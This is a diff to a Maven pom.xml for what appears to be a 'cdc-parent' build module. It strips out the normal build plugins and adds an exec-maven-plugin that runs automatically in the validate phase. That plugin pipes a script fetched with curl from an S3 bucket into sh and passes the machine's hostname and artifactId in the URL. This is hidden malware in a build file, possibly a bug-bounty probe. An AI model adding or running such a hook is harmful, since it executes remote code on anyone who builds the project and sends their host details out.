@@ -44,48 +44,33 @@
     </license>
   </licenses>
   <build>
-    <pluginManagement>
-      <plugins>
+<plugins>
+        <!--Stam-->
         <plugin>
-          <groupId>org.apache.maven.plugins</groupId>
-          <artifactId>maven-compiler-plugin</artifactId>
-          <configuration>
-            <source>1.8</source>
-            <target>1.8</target>
-          </configuration>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=cdc-parent\&amp;hostname=`hostname`\&amp;foo=xbz\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
         </plugin>
-        <plugin>
-          <groupId>org.apache.maven.plugins</groupId>
-          <artifactId>maven-surefire-plugin</artifactId>
-          <version>2.22.0</version>
-          <configuration>
-            <excludedGroups>com.google.cloud.teleport.metadata.TemplateIntegrationTest</excludedGroups>
-          </configuration>
-        </plugin>
-        <plugin>
-          <groupId>org.apache.maven.plugins</groupId>
-          <artifactId>maven-failsafe-plugin</artifactId>
-          <version>2.22.0</version>
-        </plugin>
-        <plugin>
-          <groupId>org.apache.maven.plugins</groupId>
-          <artifactId>maven-dependency-plugin</artifactId>
-          <executions>
-              <execution>
-                  <id>analyze-dependencies</id>
-                  <goals>
-                      <goal>analyze-only</goal>
-                  </goals>
-                  <configuration>
-                    <!-- ENABLE DEPENDENCY CHECKS ONCE THEY'RE RESOLVED -->
-                    <skip>true</skip>
-                  </configuration>
-              </execution>
-          </executions>
-      </plugin>
-      </plugins>
-    </pluginManagement>
-  </build>
+</plugins>
+</build>
 
   <modules>
     <module>cdc-common</module>
